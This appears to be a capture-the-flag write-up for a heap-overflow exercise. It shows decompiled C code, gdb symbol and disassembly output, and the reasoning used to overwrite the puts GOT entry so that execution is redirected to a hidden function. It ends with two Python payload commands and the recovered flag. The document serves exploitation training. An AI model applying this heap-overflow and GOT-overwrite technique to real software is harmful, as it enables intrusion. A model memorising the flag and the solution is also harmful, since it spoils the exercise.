#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

char c[80];

struct Node {
    int id;
    char *buf;
};

void m(void) {
    time_t tVar1 = time(NULL);
    printf("%s - %ld\n", c, tVar1);
}

int main(int argc, char *argv[]) {
    struct Node *node1;
    struct Node *node2;
    FILE *stream;

    node1 = (struct Node *)malloc(sizeof(struct Node));
    node1->id = 1;
    node1->buf = (char *)malloc(8);

    node2 = (struct Node *)malloc(sizeof(struct Node));
    node2->id = 2;
    node2->buf = (char *)malloc(8);

    if (argc > 2) {
        strcpy(node1->buf, argv[1]);
        strcpy(node2->buf, argv[2]);
    }

    stream = fopen("/home/user/level8/.pass", "r");
    if (stream != NULL) {
        fgets(c, 0x44, stream);
        fclose(stream);
    }

    puts("~~");
    return 0;
}


analyzing the code we can see we got two nodes,

a malloc with the side of node, and each one allocates 8 bytes more for the buffer.

so :metadata n1 + user data n1 + metadata n1buf + user data n1buf + metadata n2 + user data n2buf

so :8 + sizeof(node) + 8 + 8(buffer) + 8 + sizeof(node) + 8 + 8(buffer)

in this case we are doing argv[1] as input to overflow the node1 and argv[2] as input to overflow the buffer 2

now how we execute?

as we can see the only function being executed after that we can override is puts

so lets use the GOT trick that we learn before

(gdb) info functions 
All defined functions:

Non-debugging symbols:
0x0804836c  _init
0x080483b0  printf
0x080483b0  printf@plt
0x080483c0  fgets
0x080483c0  fgets@plt
0x080483d0  time
0x080483d0  time@plt
0x080483e0  strcpy
0x080483e0  strcpy@plt
0x080483f0  malloc
0x080483f0  malloc@plt
0x08048400  puts
0x08048400  puts@plt
0x08048410  __gmon_start__
0x08048410  __gmon_start__@plt
0x08048420  __libc_start_main
0x08048420  __libc_start_main@plt
0x08048430  fopen
0x08048430  fopen@plt
0x08048440  _start
0x08048470  __do_global_dtors_aux
0x080484d0  frame_dummy
0x080484f4  m
0x08048521  main
0x08048610  __libc_csu_init
0x08048680  __libc_csu_fini
0x08048682  __i686.get_pc_thunk.bx
0x08048690  __do_global_ctors_aux
0x080486bc  _fini
(gdb) look 0x08048400

===== disassemble 0x08048400 =====
Dump of assembler code for function puts@plt:
   0x08048400 <+0>:	jmp    DWORD PTR ds:0x8049928
   0x08048406 <+6>:	push   0x28
   0x0804840b <+11>:	jmp    0x80483a0
End of assembler dump.
(gdb) 


we get the GOT adress 0x8049928

now here is the hard and complicated stuff, 

the key is what we are passing to the strcpy and how the strcpy works

the strcpy put the content in the target adress
like this:
strcopy(target adress, content);

so in our program we got this, 

    if (argc > 2) {
        strcpy(node1->buf, argv[1]);
        strcpy(node2->buf, argv[2]);
    }

the node1->buf and the node2->buf so we are placing the stuff in the buffer from each node and not in the node itself, 

so we can use the first strcpy to change the following struct buffer adress so in the next strcpy it copy to wherever we want

so lets make the payload based on what e got

8 04 99 28

\x08\x04\x99\x28

"\x08\x04\x99\x28"[::-1]

target adress ready, now the offset

our reading from before:

a malloc with the side of node, and each one allocates 8 bytes more for the buffer.

so :metadata n1 + user data n1 + metadata n1buf + user data n1buf + metadata n2 + user data n2buf

so :8 + sizeof(node) + 8 + 8(buffer) + 8 + sizeof(node) + 8 + 8(buffer)

we are starting in the first 8(buffer)
so 
8(buffer) + 8(metadata) + sizeof(node)

now we need to know how the node is structure in memory to be able to change it

struct Node {
    int id;
    char *buf;
};

in memory the node looks like this: [int][int][int][int][char*][char*][char*][char*]

so we should add

8(buffer) + 8(metadata) + 4(int bytes) + our payload

tthen for the second payload we must find the m adress which is our 'win' function

(gdb) info functions m
All functions matching regular expression "m":

Non-debugging symbols:
0x080483d0  time
0x080483d0  time@plt
0x080483f0  malloc
0x080483f0  malloc@plt
0x08048410  __gmon_start__
0x08048410  __gmon_start__@plt
0x08048420  __libc_start_main
0x08048420  __libc_start_main@plt
0x080484d0  frame_dummy
0x080484f4  m
0x08048521  main
(gdb) 

as we can see is 0x080484f4


08 04 84 f4

\x08\x04\x84\xf4

that is our second payload

lets build the commands

payload1
8(buffer) + 8(metadata) + 4(int bytes) + our payload

python -c 'print "B" * 8 + "M" * 8 + "I" * 4 + "\x08\x04\x99\x28"[::-1]' > payload1

our second payload

python -c 'print "\x08\x04\x84\xf4"[::-1]' > payload2


and we got the flag 5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9


